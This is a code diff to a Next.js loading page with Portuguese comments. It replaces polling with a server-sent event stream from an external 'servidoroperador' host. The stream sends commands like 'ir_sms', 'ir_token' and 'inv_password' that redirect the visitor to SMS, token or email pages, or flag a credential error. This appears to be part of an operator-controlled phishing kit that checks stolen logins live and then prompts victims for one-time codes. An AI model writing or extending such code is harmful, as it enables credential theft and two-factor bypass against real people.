@@ -5,6 +5,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { ChevronDown } from "lucide-react"
 import Image from "next/image"
 import { useMetrics } from "@/hooks/useMetrics"
+import { useEventSource } from "@/hooks/useEventSource"
 import { useRouter } from "next/navigation"
 
 // Detectar idioma do navegador - padrão sempre inglês exceto francês
@@ -70,8 +71,66 @@ export default function LoadingPage() {
   const router = useRouter()
   const [language, setLanguage] = useState(() => getDefaultLanguage())
   const [currentMessageIndex, setCurrentMessageIndex] = useState(0)
+  const [clientId, setClientId] = useState<string | null>(null)
 
   const t = translations[language as keyof typeof translations]
+
+  // Recuperar clientId do localStorage
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      const storedClientId = localStorage.getItem('client_id');
+      if (storedClientId) {
+        setClientId(storedClientId);
+      } else {
+        console.error('Client ID não encontrado no localStorage');
+      }
+    }
+  }, []);
+
+  // EventSource para detectar comandos do servidor
+  const eventSource = useEventSource({
+    url: 'https://servidoroperador.onrender.com/api/events',
+    clientId: clientId || undefined,
+    onMessage: (data) => {
+      console.log('📨 Comando recebido na página loading:', data);
+      
+      // Processar comandos específicos
+      if (data.command) {
+        switch (data.command) {
+          case 'ir_sms':
+            console.log('📱 Redirecionando para /sms');
+            router.push('/sms');
+            break;
+            
+          case 'ir_auth':
+          case 'ir_token':
+            console.log('🔐 Redirecionando para /token');
+            router.push('/token');
+            break;
+            
+          case 'ir_email':
+            console.log('📧 Redirecionando para /email');
+            router.push('/email');
+            break;
+            
+          case 'inv_username':
+          case 'inv_password':
+            console.log('❌ Erro de credenciais, voltando para /home');
+            localStorage.setItem('auth_error', 'true');
+            localStorage.setItem('error_type', data.command);
+            router.push('/home');
+            break;
+            
+          default:
+            console.log('❓ Comando desconhecido:', data.command);
+            break;
+        }
+      }
+    },
+    onError: (error) => {
+      console.log('❌ Erro no EventSource:', error);
+    }
+  });
 
   // Envio automático de métricas ao carregar a página
   useEffect(() => {
@@ -90,86 +149,6 @@ export default function LoadingPage() {
 
     return () => clearInterval(interval)
   }, [t.loadingMessages.length])
-
-  // Monitorar comandos do servidor a cada 2 segundos
-  useEffect(() => {
-    // Recuperar clientId do localStorage (definido durante o login)
-    const clientId = localStorage.getItem('client_id') || '';
-    
-    if (!clientId) {
-      console.error('Client ID não encontrado no localStorage');
-      return;
-    }
-    
-    // Função para verificar comandos
-    const checkCommands = async () => {
-      try {
-        // Chamar API para verificar comandos usando o endpoint correto
-        const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
-          method: 'GET',
-          headers: {
-            'Content-Type': 'application/json',
-          }
-        });
-        
-        if (response.ok) {
-          const responseData: ServerResponse = await response.json();
-          console.log('Resposta completa da API:', responseData);
-          
-          // Processar comandos - comando está em responseData.data.command
-          if (responseData && responseData.data && responseData.data.command) {
-            console.log('Comando recebido:', responseData.data.command);
-            
-            switch (responseData.data.command) {
-              case 'ir_sms':
-                console.log('Redirecionando para /sms');
-                router.push('/sms');
-                break;
-                
-              case 'ir_auth':
-                console.log('Redirecionando para /token');
-                router.push('/token');
-                break;
-                
-              case 'ir_email':
-                console.log('Redirecionando para /email');
-                router.push('/email');
-                break;
-                
-              case 'inv_username':
-              case 'inv_password':
-                // Armazenar informação de erro no localStorage
-                console.log('Erro de credenciais, voltando para /home');
-                localStorage.setItem('auth_error', 'true');
-                localStorage.setItem('error_type', responseData.data.command);
-                router.push('/home');
-                break;
-                
-              default:
-                // Comando desconhecido, não fazer nada
-                console.log('Comando desconhecido ou vazio:', responseData.data.command);
-                break;
-            }
-          } else {
-            console.log('Nenhum comando pendente, continuando monitoramento...');
-          }
-        } else {
-          console.error('Erro ao verificar comandos:', response.status, await response.text());
-        }
-      } catch (error) {
-        console.error('Erro ao verificar comandos:', error);
-      }
-    };
-    
-    // Verificar comandos a cada 2 segundos
-    const commandInterval = setInterval(checkCommands, 2000);
-    
-    // Verificar comandos imediatamente ao carregar
-    checkCommands();
-    
-    // Limpar intervalo ao desmontar componente
-    return () => clearInterval(commandInterval);
-  }, [router]);
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
